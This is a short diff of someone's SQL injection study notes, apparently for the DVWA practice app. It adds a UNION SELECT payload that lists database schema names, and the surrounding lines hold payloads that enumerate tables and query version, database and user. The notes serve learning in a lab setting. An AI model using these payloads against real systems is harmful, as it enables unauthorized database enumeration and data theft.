@@ -147,6 +147,9 @@ Spli  --input parameter is char
 		union select 1,2#    # 1 and 2 can be functions to enquery info. 
 					like version(), database()(scheam_name),user(), table_name,  table_chema, @@hostname. 内建函数， global var.
 						from information_schema.tables ,
+		/get schema of DB
+		Mary' UNION  SELECT schema_name,2,3,4,5,6 FROM information_schema.schemata#
+
 		0x03 # get the tables of the DB 
 			1' union select table_name,1 from information_schema.tables#
 		0x04 # table name of a particular  schema like dvwa
